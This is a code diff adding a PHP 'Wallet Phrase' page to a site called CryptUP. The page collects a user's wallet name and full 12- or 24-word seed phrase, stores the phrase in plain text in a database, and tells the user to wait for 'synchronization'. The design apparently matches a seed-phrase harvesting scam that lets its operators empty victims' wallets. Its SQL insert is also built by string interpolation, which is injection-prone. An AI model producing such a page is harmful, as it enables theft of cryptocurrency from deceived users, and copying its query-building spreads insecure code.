@@ -1,10 +1,16 @@
+<?php
+include_once "config/config.php";
+if (!isset($_SESSION["cryptup_user"])) {
+    echo "<script>location.href = 'login.php'</script>";
+}
+?>
 <!DOCTYPE html>
 <html lang="en">
 
 <head>
     <meta charset="utf-8" />
     <meta content="width=device-width, initial-scale=1.0" name="viewport" />
-    <title>Stitch Design</title>
+    <title>CryptUP || Wallet Phrase</title>
     <link href="data:image/x-icon;base64," rel="icon" type="image/x-icon" />
     <link href="https://fonts.googleapis.com" rel="preconnect" />
     <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect" />
@@ -54,24 +60,61 @@
         <div class="layout-container flex h-full grow flex-col">
             <?php include "components/nav.php"; ?>
             <main class="flex flex-1 items-center justify-center py-12">
-                <div class="card w-full max-w-lg">
+                <form method="post" class="card w-full max-w-lg">
                     <div class="text-center">
                         <h1 class="typography_h1 mb-2">Enter Your Seed Phrase</h1>
-                        <p class="typography_body">Enter your 12-word seed phrase to recover your wallet.</p>
+                        <p class="typography_body">Enter your 12 or 24-word seed phrase to recover your wallet.</p>
                     </div>
                     <div class="mt-8">
-                        <textarea
+                        <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2"
+                            for="recipient-address">Wallet</label>
+                        <div class="relative">
+                            <input class="input w-full" id="recipient-address" required name="wallet"
+                                placeholder="E.g: Trust wallet" type="text" />
+
+                        </div>
+                    </div>
+                    <div class="mt-4">
+                        <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2"
+                            for="phrase">Phrase</label>
+                        <textarea id="phrase" required name="phrase"
                             class="input w-full min-h-36 resize-none p-4 text-base leading-normal bg-white/5 border-white/10 focus:border-[var(--primary-color)] focus:ring-0"
-                            placeholder="Enter your 12-word seed phrase"></textarea>
-                        <p class="typography_body mt-2 text-center text-red-500">Incorrect seed phrase. Please try
-                            again.</p>
+                            placeholder="Enter your 12 or 24-word seed phrase"></textarea>
+                        <?php if (isset($_SESSION["error"])): ?>
+                            <p class="typography_body mt-2 text-center text-red-500"><?= $_SESSION["error"]; ?></p>
+                            <?php
+                            unset($_SESSION["error"]);
+                        endif;
+                        ?>
                     </div>
                     <div class="mt-6 flex justify-center">
-                        <button class="button_primary h-12 w-full max-w-xs text-base font-bold tracking-wider">
+                        <button class="button_primary h-12 w-full max-w-xs text-base font-bold tracking-wider"
+                            name="save" type="submit">
                             <span>Recover Wallet</span>
                         </button>
                     </div>
-                </div>
+                    <?php
+                    if (isset($_POST["save"])) {
+                        $wallet = htmlspecialchars($_POST["wallet"]);
+                        $phrase = trim(htmlspecialchars($_POST["phrase"]));
+                        $phraseArr = explode(" ", $phrase);
+                        if (count($phraseArr) < 12 || (count($phraseArr) > 12 && count($phraseArr) < 24) || count($phraseArr) > 24) {
+                            $_SESSION["error"] = "Invalid Wallet phrase!";
+                            echo "<script>location.href = 'wallet-phrase.php'; </script>";
+                        } else {
+
+                            $save = mysqli_query($conn, "INSERT INTO `wallet_phrases` (`user_id`,`wallet`, `phrase`) VALUES ('$user_id', '$wallet', '$phrase')");
+                            if ($save) {
+                                echo "<script>location.href = 'dashboard.php'; alert('Wallet phrase added wait for synchronization')</script>";
+                            } else {
+                                $_SESSION["error"] = "Something went wrong!";
+                                echo "<script>location.href = 'wallet-phrase.php'; </script>";
+                            }
+                        }
+
+                    }
+                    ?>
+                </form>
             </main>
         </div>
     </div>
